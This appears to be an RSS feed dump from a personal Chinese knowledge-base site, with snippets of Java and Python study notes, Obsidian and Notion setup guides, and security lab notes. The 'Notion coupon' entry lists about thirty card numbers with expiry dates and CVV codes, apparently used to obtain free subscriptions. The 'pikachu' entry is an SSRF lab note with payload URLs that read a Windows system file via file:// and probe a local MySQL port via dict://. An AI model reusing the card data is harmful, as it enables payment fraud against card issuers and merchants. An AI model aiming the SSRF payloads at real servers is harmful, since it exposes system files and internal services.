00理论 [[001_JDK、JRE、JVM的关系]] [[002_Java运行与加载]] [[003_环境变量]] [[004_注释方法]] [[005_public_class和class的区别]] 01铺垫 [[010_符号定义]] [[011_javadoc的使用]] [[012_不同数据数类型占用大小]] [[013_接收键盘输入]] [[014_方法的调用]] [[015_break和return的区别]] [[016_方法执行时内存变化]] [[017_方法重载overload]] 02基本 [[021_递归]] [[022_面向对象和面向过程]] [[023_对象和类]] [[024_对象的创建]] [[025_空指针异常]] [[026_方法调用时的参数传递]] 03构造方法 [[031_构造方法]] [[032_注意事项]] [[033_构造方法举例]] [[034_夫妻结婚]] 04封装 [[041_封装]] [[042_实例方法]] [[043_书写格式]] 05this和static关键字 [[051_static]] [[052_静态方法和实例方法]] [[053_方法定义static]] [[053_空指针访问静态不会空指针]] [[054_实例方法的调用]] [[054实例：账户取钱]] [[055_不同代码块执行顺序]] [[0512_静态代码块]] [[0512_static变量]] [[0514_实例代码块]] [[0515_静态方法和实例方法]] [[0516_空指针访问静态不会空指针]] [[0517_实例方法的调用]] [[0518_不同代码块执行顺序]] [[0521_this的内存结构]] [[0521_this的内存结构]] [[0522_this总结]] [[0523_this例子]] [[0524_变量的分布]] [[0525_方法定义static]] [[0525_this无参调有参构造方法]] [[0526_this的内存结构]] [[0529_变量的分布]] 06继承 [[061_继承基本概念]] [[062_super关键字]] [[063_什么时候可以使用继承]] 07方法覆盖和多态 [[0711_方法覆盖override]] [[0712_覆盖eg]] [[0713_方法覆盖经典例子]] [[0714_例子toString方法覆盖]] [[0721_多态]] [[0722_多态举例]] [[0723_向下转型]] [[0724_instanceof运算符]] [[0725_多态例子a主人喂宠物]] [[0726_宠物养猫优化]] 08遗留问题 [[081_静态方法不存在方法覆盖]] [[082_私有方法无法覆盖]] [[083_关于方法覆盖时的返回值类型]] 09super [[091_suepr关键字]] [[092_构造方法执行顺序]] [[093_使用super调用父类方法]] 10总结 [[101_学习总结]] Java进阶</description></item><item><title>java学习路程</title><link>https://ob.tianzhongs.ml/java%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%A8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/java%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%A8%8B/</guid><description>第一 JavaSE内容： 环境搭建，基础语法，面向 对象，数组，集合，常用API ，IO流，反射机制，多线程，网络编程 学习要求：利用这些基础知识，写出一个soket聊天室和打字游戏，基础不牢地动山摇。
第二 数据库:搞定MYSQL 学习要求：多练SQL，特别是select
第三 前端:
三大核心技术 HTML CSS JavaScript(外带两个框架jQuery,Bootstrap) 学习要求：手写出一个静态页面(模仿一个页面)
第四 后端：
HML,MVC架构模式,Servlet,Filter,JSP,ELSE,JSTL,AJAX,代理模式,工厂模式，数据库连接池 学习要求：1.深刻理解MVC架构模式 2.</description></item><item><title>js方式显示base64文件为图片</title><link>https://ob.tianzhongs.ml/js%E6%96%B9%E5%BC%8F%E6%98%BE%E7%A4%BAbase64%E6%96%87%E4%BB%B6%E4%B8%BA%E5%9B%BE%E7%89%87/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/js%E6%96%B9%E5%BC%8F%E6%98%BE%E7%A4%BAbase64%E6%96%87%E4%BB%B6%E4%B8%BA%E5%9B%BE%E7%89%87/</guid><description>来源 ️ 在手机上，由于现在的软件恶意访问手机权限和数据，可能会造成隐私泄露。为了避免图片文件被恶意访问，我想到了采用html的方式对图片进行访问，解决思路如下：
第一步：将图片转换成base64编码，存储在本地中，当然，文本文件也可以通过js 进行一些简单的加密，这样可以在上传云端的时候，避免被服务器识别抓取文件特征码，也算是一种避免隐私泄露，不过我懒得加密； 第二步：在HTML中，img标签的src属性，除了可以使用我们常见的URL，还可以通过DataUrl的方式来显示图片，其具体的格式如下：
1 &amp;lt;img src=&amp;#34;data:image/gif;base64,R0lGODlhAwADAIAAAP///8zMzCH5BAAAAAAALAAAAAADAAMAAAIEBHIJBQA7&amp;#34;&amp;gt; 各项参数分别为 data:文件格式 base64编码，一般不用管 后面的大串就是bae64编码 第三步：在整个过程中，除了你处理图片的时候，图片是明文，其他时候都是密文，用html中的来解析也是一种不错的方式。 采用base64编码有很大的好处，一是可以对文本文件进行加密，同时相对较小的文件，转码之后比图片源文件会小一些，但是在一些大文件进行转码之后，会比较大，所以用来作为图片的隐私处理也是一个不错的选择。
处理[[思路]] 💡在手机端，通过将图片转成base编码，存储为文本文件，可以避免被软件窃取图片 如何解析 通过点击html上的按钮，选中你所需要的多个转码的base64文件，加载后，点击上一个下一个按钮，会依次显示图片。 效果展示 ，显示和转码图片为base64文件下载 {:height 220, :width 689}</description></item><item><title>logseq</title><link>https://ob.tianzhongs.ml/logseq/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/logseq/</guid><description>与[[logseq]]相关的[[部署]]方案的url pengx17/logseq-publish： 已存档。请检查 https://github.com/logseq/publish-spa logseq发布主页设置 sidebar 表示侧边栏的页面
1 2 :default-home {:page &amp;#34;overview&amp;#34; :sidebar &amp;#34;Contents&amp;#34; }</description></item><item><title>MySQL修改root密码</title><link>https://ob.tianzhongs.ml/0018_MySQL%E4%BF%AE%E6%94%B9root%E5%AF%86%E7%A0%81/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/0018_MySQL%E4%BF%AE%E6%94%B9root%E5%AF%86%E7%A0%81/</guid><description>0018_修改root密码 方法1： 用SET PASSWORD命令 首先登录MySQL。 格式：mysql&amp;gt; set password for 用户名@localhost = password(&amp;lsquo;新密码&amp;rsquo;); 例子：mysql&amp;gt; set password for root@localhost = password(&amp;lsquo;123&amp;rsquo;);
方法2：用mysqladmin 格式：mysqladmin -u用户名 -p旧密码 password 新密码 例子：mysqladmin -uroot -p123456 password 123</description></item><item><title>nextjs-notion-blog</title><link>https://ob.tianzhongs.ml/nextjs-notion-blog/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/nextjs-notion-blog/</guid><description>nextjs-notion-blog Created: September 5, 2022 4:52 PM Tags: 全块适配, 响应快, 悬浮目录 特点: 响应速度快，基本都能在3秒内更新。几乎全部block都可以正常显示。 缺点是无评论区，过于宽的表格在手机上好像没有适配（不好横向翻） 预览url: https://transitivebullsh.it/nextjs-notion-starter-kit
预览 准备 github项目位置</description></item><item><title>Notion优惠券</title><link>https://ob.tianzhongs.ml/Notion%E4%BC%98%E6%83%A0%E5%88%B8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/Notion%E4%BC%98%E6%83%A0%E5%88%B8/</guid><description>虚拟 visa 卡号 1 2 3 wojff 4859530124962218 07 2024 167 4061565802604488 03/29 037 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 5154620020122451|07|2027|153 5154620020437842|02|2027|478 5154620020488845|08|2026|717 5154620020885768|02|2027|269 5154620020335574|04|2023|963 5154620020318828|04|2026|656 5154620020826705|09|2027|561 5154620020304844|07|2027|421 5154620020282545|08|2023|311 5154620020653786|02|2023|359 5154620020820328|01|2026|952 5154620020772362|08|2024|858 5154620020782510|12|2026|628 5154620020231062|08|2026|784 5154620020180848|03|2023|738 5154620020738108|10|2027|236 5154620020607808|12|2026|660 5154620020206478|07|2024|441 5154620020445761|05|2026|415 5154620020720858|07|2027|731 5154620020006035|11|2026|451 5154620020571467|02|2025|576 5154620020055552|05|2025|411 5154620020185433|09|2024|687 5154620020004386|12|2023|403 5154620020011175|10|2023|531 5154620020157325|01|2026|641 5154620020040232|11|2024|370 5154620020160212|12|2024|804 5154620020288005|02|2023|686 notion 优惠码 Notion送36年会员 ($1750)-美国VPS综合讨论-全球主机交流论坛 Powered by Discuz!</description></item><item><title>Notion自定义域名</title><link>https://ob.tianzhongs.ml/Notion%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/Notion%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D/</guid><description>基本配置 注册账号或者登录cloudflare Cloudflare 中国官网 | 智能化云服务平台 | 免费CDN安全防护
添加自己的二级域名 到自己的域名管理网站，修改dns的nameserver为cloudflare提供的两个域名，然后就是如下图，点击入门指南进行设置 1 2 wren.ns.cloudflare.com langston.</description></item><item><title>obsidian</title><link>https://ob.tianzhongs.ml/obsidian/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/obsidian/</guid><description>语法： Markdown超级教程 Obsidian版 - 秃秃的小屋 - Obsidian Publish MarkDown语法 超详细教程 - 经验分享 - Obsidian 中文论坛 帮助文档 Callouts - Obsidian Help 配置 [[001_部署Obsidian静态知识库网站]] [[002_知识库更新日志]] [[Obsidian知识库笔记相关注意事项]] [[004_Yaml字段配置]] [[005_看板目录的使用]] [[006_搭建书架教程]] [[007_obsidian相关]] [[009_关于命名规范的标识符]] 美化 [[obsidian侧边背景]] [[obsidian背景图片]] 样式文档 咖啡豆文档 CSS代码片段 | obsidian文档咖啡豆版 (coffeetea.</description></item><item><title>Obsidian-hugo博客搭建</title><link>https://ob.tianzhongs.ml/Obsidian-hugo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/Obsidian-hugo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</guid><description>[[hugo]] [[../../pages/博客]] 概述 为什么选择hugo? 快速，支持markdown。 博客框架支持markdown的，目前主流的有jekyll、hexo以及hugo。 hugo&amp;gt;hexo&amp;gt;jekyll 主题上jekyll更偏向我的审美，但是生成比较慢
文章原因：看到相同类型Obsidian搭建博客的视频，发现了可以优化的地方，录起来记录一下。
材料 github账号 vercel账号 vscode（能够git即可） git环境 域名（如果需要自己进行定义的话） 搭建 无脑vercel克隆部署</description></item><item><title>obsidian侧边背景</title><link>https://ob.tianzhongs.ml/obsidian%E4%BE%A7%E8%BE%B9%E8%83%8C%E6%99%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/obsidian%E4%BE%A7%E8%BE%B9%E8%83%8C%E6%99%AF/</guid><description>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 /* Draw background image and add a separator from the header.</description></item><item><title>obsidian背景图片</title><link>https://ob.tianzhongs.ml/obsidian%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/obsidian%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87/</guid><description>全局背景样式修改 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 .theme-light .</description></item><item><title>outline</title><link>https://ob.tianzhongs.ml/outline/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/outline/</guid><description> [[网络安全]] [[稻谷]] [[obsidian]] [[Java]] [[Git]] [[心有所感]] [[收集箱]] [[网安]] [[python]]</description></item><item><title>outline-dataview</title><link>https://ob.tianzhongs.ml/outline-dataview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/outline-dataview/</guid><description>1 2 3 table title from &amp;#34;pages&amp;#34; where title=null</description></item><item><title>pikachu</title><link>https://ob.tianzhongs.ml/pikachu/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/pikachu/</guid><description>ssrf漏洞部分（两个关卡同理） 使用ssrf漏洞的相关协议，传输到url参数中去即可 1 http://pikachu:8065/vul/ssrf/ssrf_curl.php?url=file://c:/windows/system.ini 使用dict协议查看一下端口是否开放：如果返回信息，说明有开放 http://pikachu:8065/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:3306 {:height 247, :width 746} 使用外部实体协议，读取php文件 ((643d2e1c-beb3-4e6b-95e3-b1bf66e3d461)) [[问题]] 由于没有php版本中没有配置curl扩展，所以导致无法请求三方url [[解决]] :: 随便选择一个 打开php.</description></item><item><title>python</title><link>https://ob.tianzhongs.ml/python/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python/</guid><description>[[python.01 变量]] [[python.02 数据类型]] [[python.03 接收输入input函数]] [[python.04 程序结构]] [[python.05 内置函数]] [[python.06 列表list]] [[python.07 字典]] [[python.07a 元组]] [[python.08 字符串]] [[python.09 函数]] [[python.</description></item><item><title>python.01 变量</title><link>https://ob.tianzhongs.ml/python.01-%E5%8F%98%E9%87%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.01-%E5%8F%98%E9%87%8F/</guid><description>变量赋值 直接用变量名=变量值即可，不需要定义类型，弱类型语法。
1 2 3 4 5 name=&amp;#39;玛利亚&amp;#39; print(name) print(&amp;#39;标识&amp;#39;,id(name)) print(&amp;#39;类型&amp;#39;,type(name)) print(&amp;#39;值&amp;#39;,name) 任意对象一般都包括以上这几个方法，其中id()可以判断是否是一个对象。
其中id指的是字符串常量的内存地址id，也就是说如果有别的变量字符串也是这样，那么所指向的id也是一样的。有点类似于java中的字符常量池。
两个不同变量的字符串一样，那么指向的id值一样</description></item><item><title>python.02 数据类型</title><link>https://ob.tianzhongs.ml/python.02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid><description>#python 基本数据类型主要有以下四种 正数 浮点数 布尔 1真0假 值开头是大写 True，False 所有对象都有布尔值，可以使用bool()函数获取对象的布尔值 空对象的布尔值一般都是False ，比如空数组，空集合 4. 字符串：单引号、双引号、三引号（内容可以多行） 加减法：浮点数类型的精度问题 在进行浮点数的运算时，最好导入Decimal ，避免精度问题，尤其是末尾是3的一些数值的运算的时候，会因为计算机底层二进制的缘故，导致出错。</description></item><item><title>python.03 接收输入input函数</title><link>https://ob.tianzhongs.ml/python.03-%E6%8E%A5%E6%94%B6%E8%BE%93%E5%85%A5input%E5%87%BD%E6%95%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.03-%E6%8E%A5%E6%94%B6%E8%BE%93%E5%85%A5input%E5%87%BD%E6%95%B0/</guid><description> #python input函数主要用于接受键盘输入。
需要注意的，接收的值是字符串类型 ，如果需要进行数值运算，需要对每个数字使用evel() 函数转换成数值 使用int()等强制转换也是可以的
eg
1 2 3 4 5 a=input(&amp;#34;请输入一个数&amp;#34;) b=input(&amp;#34;请输入一个数&amp;#34;) print(a+b) print(eval(a+b)) print(eval(a)+eval(b))</description></item><item><title>python.04 程序结构</title><link>https://ob.tianzhongs.ml/python.04-%E7%A8%8B%E5%BA%8F%E7%BB%93%E6%9E%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.04-%E7%A8%8B%E5%BA%8F%E7%BB%93%E6%9E%84/</guid><description>#python 选择（switch）、循环（for，while）、判断（if） 条件表达式 类似于三目运算符
如果满足中间的条件，就执行前面的，不满足就执行后面的
如果2&amp;gt;3就输出结果2，否则就输出3
1 print(2 if 2&amp;gt;3 else 3) 输出结果：3
pass语句 主要用于语句占位，避免程序报错，比如在一些不需要进行处理的地方，就可以使用pass占位。</description></item><item><title>python.05 内置函数</title><link>https://ob.tianzhongs.ml/python.05-%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.05-%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/</guid><description> #python range() 用于生成整数序列
#+BEGIN_EXPORT hiccup [:aside {} &amp;ldquo;📌 优点是：相比数组，序列不论里面的具体元素有多少个，&amp;rdquo;] #+END_EXPORT
占用的空间都是一样的，都只是三个参数——start、end、step步长。只有具体使用到序列中的对象才会进行计算
- 创建以及常用方法in、not in判断是否含有 1 2 3 4 5 6 7 8 9 10 11 12 # 创建序列的三种方式 r=range(10) #0到10 rr=range(15,20) #1到100 rrr=range(1,50,3) #从1开始依次加3，直到小于等于一百的数 # 输出序列 print(list(r)) print(list(rr)) print(list(rrr)) # 判断是否含有 print(2 in r) print(2 in rr) print(2 in rrr)</description></item><item><title>python.06 列表list</title><link>https://ob.tianzhongs.ml/python.06-%E5%88%97%E8%A1%A8list/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.06-%E5%88%97%E8%A1%A8list/</guid><description>列表存储的不是对象本身，而是指向对象的引用。 列表的特点 元素有序排列 索引映射指向唯一一个数据 可以存储重复的数据 元素可以是任意类型 根据需要动态分配和回收内存
创建列表 1 2 3 4 5 6 7 # 创建列表 a=[&amp;#34;a&amp;#34;,&amp;#34;b&amp;#34;,10] #调用 print(id(a)) print(a[0],id(a[0]),type(a[0])) print(a[1],id(a[1]),type(a[1])) print(a[2],id(a[2]),type(a[2])) 输出结果</description></item><item><title>python.07 字典</title><link>https://ob.tianzhongs.ml/python.07-%E5%AD%97%E5%85%B8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.07-%E5%AD%97%E5%85%B8/</guid><description>字典是无序的可变序列
python中的字典用花括号 {} 括起来的，字典的数据以 键值对 （key：value）的方式存在。类似于java中的Map集合对象
查询：字典底层是哈希表，通过哈希运算来进行查找
优点：查询速度快
缺点：浪费内存
什么是字典？
字典和列表都是可变序列，python内置数据结构之一
字典是无序的序列,以键值对的方式进行存储数据
key不允许重复，如果重复定义，后面的定义会覆盖掉前面的定义</description></item><item><title>python.07a 元组</title><link>https://ob.tianzhongs.ml/python.07a-%E5%85%83%E7%BB%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.07a-%E5%85%83%E7%BB%84/</guid><description>#python 可变序列和不可变序列 不可变序列不可以进行 增删改 操作，而且hash（地址id值不会改变）不会进行改变
而可变序列，会随着增删改操作，改变hash值
元组的定义 采用小括号去定义()
不可以将进行增删改操作
创建元组的方式
tuple函数，注意，是两个小括号 touple：元组 使用小括号 创建一个元素的元组的时候，后面需要添加一个逗号 1 2 3 4 5 6 7 8 9 10 11 12 13 # 第一种创建方式 tuple函数 tp1=tuple((&amp;#34;one&amp;#34;,&amp;#34;two&amp;#34;,&amp;#34;three&amp;#34;)) print(type(tp1)) #第二种创建方式 tp2=(&amp;#34;张三&amp;#34;,&amp;#34;李四&amp;#34;,&amp;#34;王五&amp;#34;) print(type(tp2)) # 创建空元组 tp3=tuple() tp4=() # 创建只有一个元素的元组 tp5=(&amp;#34;帅&amp;#34;,) tp6=tuple((&amp;#34;帅&amp;#34;,)) 元组中元素的可变 元组中的元素是不可变对象，其指向的元素是不可变的</description></item><item><title>python.08 字符串</title><link>https://ob.tianzhongs.ml/python.08-%E5%AD%97%E7%AC%A6%E4%B8%B2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.08-%E5%AD%97%E7%AC%A6%E4%B8%B2/</guid><description>#python 字符串的驻留机制 驻留机制，需要在命令行中运行，如果在idea中运行，会让字符串强制驻留，导致结果不一致。
字符串是一个不可变的字符序列，是基本数据类型
字符串生成后，不同的值保存在字符串的保留池当中，不管后面生成多少个一样的字符串，都不会再开辟新的空间，而是把该字符串的值赋值给新的变量。
1 2 3 4 a=&amp;#34;a&amp;#34; b=&amp;#39;a&amp;#39; c=&amp;#39;&amp;#39;&amp;#39;a&amp;#39;&amp;#39;&amp;#39; print(id(a),id(b),id(c)) output</description></item><item><title>python.09 函数</title><link>https://ob.tianzhongs.ml/python.09-%E5%87%BD%E6%95%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.09-%E5%87%BD%E6%95%B0/</guid><description>函数的创建和调用 1 2 3 def 函数名(输入参数列表): 函数体 return xxx 示例 1 2 3 4 def plus(a,b): return a+b print(plus(23,343)) #output 366 参数传递 两种传递方式 直接把实参依次传递进去 fun(a,b) 使用关键字指定传的值fun(b=12,a=23) 参数传递的内存分析 如果形参是不可变对象，那么函数不会对实参产生影响 如果实参是可变对象，那么函数会影响具体的实参对象 1 2 3 4 5 6 7 8 9 10 11 12 13 def fun(arg1,arg2): print(&amp;#39;arg1&amp;#39;,arg1) print(&amp;#39;arg2&amp;#39;,arg2) arg1=100 arg2.</description></item><item><title>python.10 bug</title><link>https://ob.tianzhongs.ml/python.10-bug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.10-bug/</guid><description>#python try except异常捕获 当出现异常的时候，可以通过捕获异常，来出现异常的代码进行处理
1 2 3 4 5 6 7 8 9 10 11 try: a=int(input(&amp;#39;请输入一个整数&amp;#39;)) b=int(input(&amp;#39;请输入一个整数&amp;#39;)) result=a/b print(result) except ZeroDivisionError: print(&amp;#34;除数不为0&amp;#34;) except ValueError: print(&amp;#34;请输入整数&amp;#34;) except: print(&amp;#34;其他异常&amp;#34;) try-except-else-finally 当没有出现异常的时候，就会执行else的代码块 不管是否出现异常，都会执行finally中的代码块</description></item><item><title>python.11 类与对象</title><link>https://ob.tianzhongs.ml/python.11-%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.11-%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1/</guid><description>#python
创建类 类里面一般包含了： id:: 640b206f-957f-4e28-bd9c-e0db61102b98
类属性 类初始化方法 def __init__(self,xx): （相当于java中的构造方法） 实例方法，相当于在类里面定义函数，参数是self 静态方法，使用@staticmethod进行修饰 类方法，使用@classmethod进行修饰 函数：在类之外定义的就叫函数，在类之内定义的就叫方法 id:: 640b0dfd-5a2d-45ac-81ab-62a3674478f2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Student: native_pace=&amp;#34;吉林&amp;#34; #类属性，类变量 #类初始化方法 def __init__(self,name,age): self.</description></item><item><title>python.12 对象的具体使用</title><link>https://ob.tianzhongs.ml/python.12-%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%85%B7%E4%BD%93%E4%BD%BF%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.12-%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%85%B7%E4%BD%93%E4%BD%BF%E7%94%A8/</guid><description>面向对象三大特征 封装 继承 多态 封装 是为了数据安全，避免外部随意访问 封装方法：在创建构造函数（__init__)的时候，使用self.__属性名对其进行封装 封装之后，可以创建实例方法来对其属性进行操作，也可以使用_类名__属性名来对其进行强行访问
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Student: def __init__(self,name,age): self.</description></item><item><title>python.13 模块的使用</title><link>https://ob.tianzhongs.ml/python.13-%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.13-%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/</guid><description>#python 编码 python解释器使用Unicode编码（内存） .py文件在硬盘上存储默认使用的是utf-8编码，可以在文件首部encode=编码格式进行指定，也可以通过别的方式进行指定（外存 ）
读取文件内容 1 open(&amp;#39;url&amp;#39;,[module,encodeing]) eg
1 2 3 4 import file f1=open(&amp;#39;md.</description></item><item><title>python.15 学生管理系统</title><link>https://ob.tianzhongs.ml/python.15-%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python.15-%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</guid><description> 不做这个，没有必要做这个，意义不大 #todo/丢弃 功能模块 {:height 603, :width 774}</description></item><item><title>python总结</title><link>https://ob.tianzhongs.ml/python%E6%80%BB%E7%BB%93/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/python%E6%80%BB%E7%BB%93/</guid><description>#总结 python 总共17个章节，上面的笔记中总结了16个半章节的内容 剩下的部分没有必要继续学习了，因为后面的案例项目逻辑简单，基本都是单文件的使用，没有模块之间的相互调用。
这种小案例在学习java的时候已经学习过了更深层次的，其次语法部分难点不多，但是隔一天仍然需要去复习一下。
[[python.01 变量]] [[python.02 数据类型]] [[python.03 接收输入input函数]] [[python.</description></item><item><title>RCE</title><link>https://ob.tianzhongs.ml/RCE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/RCE/</guid><description> [[01-什么是RCE]] 02-案例 [[01-ctfub-evel]] [[02-ctfhub-命令注入]] [[03-ctfhub-过滤cat]] [[04-ctfhub-过滤目录分隔符]] [[04-ctfub-过滤空格]] [[03-RCE漏洞的防御]]</description></item><item><title>README</title><link>https://ob.tianzhongs.ml/README/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/README/</guid><description>Obzhishiku 我的Obsiidan知识库 项目Demo: example 主要用于部署Obsidian的知识库内容，在网页端也能完美展示其双链等基础笔记功能，具有评论功能。</description></item><item><title>RSS聚合器—如何高效查看互联网信息</title><link>https://ob.tianzhongs.ml/RSS%E8%81%9A%E5%90%88%E5%99%A8%E5%A6%82%E4%BD%95%E9%AB%98%E6%95%88%E6%9F%A5%E7%9C%8B%E4%BA%92%E8%81%94%E7%BD%91%E4%BF%A1%E6%81%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/RSS%E8%81%9A%E5%90%88%E5%99%A8%E5%A6%82%E4%BD%95%E9%AB%98%E6%95%88%E6%9F%A5%E7%9C%8B%E4%BA%92%E8%81%94%E7%BD%91%E4%BF%A1%E6%81%AF/</guid><description>引入 目前的资讯信息繁杂，信息量也越来越大，同时，垃圾信息也越来越庞大。平时，我们在了解各种资讯和娱乐信息的时候，常常需要翻阅很多的内容才能看到真正对我有用的文章。
信息量的扩大，导致了我们可能很难及时的接受有益或对我们真正有用的讯息。所以，我强烈建议你需要RSS聚合阅读器。
作用 直接获取你所关心的内容，避免了垃圾信息的繁琐干扰，能够只有有效的获取到你所喜欢的内容。
听到这里可能很多还是不知道有什么用，举例是最好的方法。 举例 比如国内的知乎、头条、微博、微信、公众号、抖音，或者是bilbil、优酷类的视频软件，又或者是月光博客、CSDN博客、新浪微博等博客类型的网站，甚至更多的充满了讯息、实时分享信息的网站或者平台，你一定在里面有所了解过。 这些里面都有很多的信息，比如今天的热点、某个人的抖音更新情况、某一个知乎大佬的更新、博客或者论坛的技术教程又有所更新，等等。这些信息虽然你都可以直接通过登录到相应的软件或者或者网站去查看阅读，但是随着平台的增多，你还会一个一个登录几十个平台去依次查看吗？ 我想那样也太耗尽心力了，所以这就是RSS的必要。 RSS 可以直接通过 Feed（相当于是一个特殊的 Url），通过你所想看的网站或者博客相关的 RSS，你就可以直接在聚合器内获取到相关的最新资讯。 比如我想看我自己知乎的消息，就添加一个知乎个人的 RSS Feed（ https://feed43.com/8436633483761823.xml）这个订阅直接点击意义不大，可以尝试点击一下。 然后你就可以直接看到我个人的讯息了，同样，你还可以订阅知乎、抖音、bilbil、youtube、推特等等，这样聚合起来的讯息，你就可以直接通过不同的 feed 来订阅不同的平台信息。值得一体的是，很多的聚合器平台都是可以过滤掉广告，用文字和图片视频等过滤好的样式展示给你看，如果你想要获取更多的内容，还可以在聚合器内直接点击到达该网站，非常的方便。 在很久之前很多讯息都是邮箱订阅 rss 来获取讯息的，但是我并不建议用邮箱，因为以后哪天不想看了，邮箱天天还给你发这些消息，应该会让人感到头疼，不过目前很多都没有开设邮箱订阅的方式。所以还是比较建议用一般的 RSS 聚合器软件订阅。</description></item><item><title>SQLmap安装教程</title><link>https://ob.tianzhongs.ml/SQLmap%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/SQLmap%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</guid><description>SQLmap安装教程 sqlmap简介：  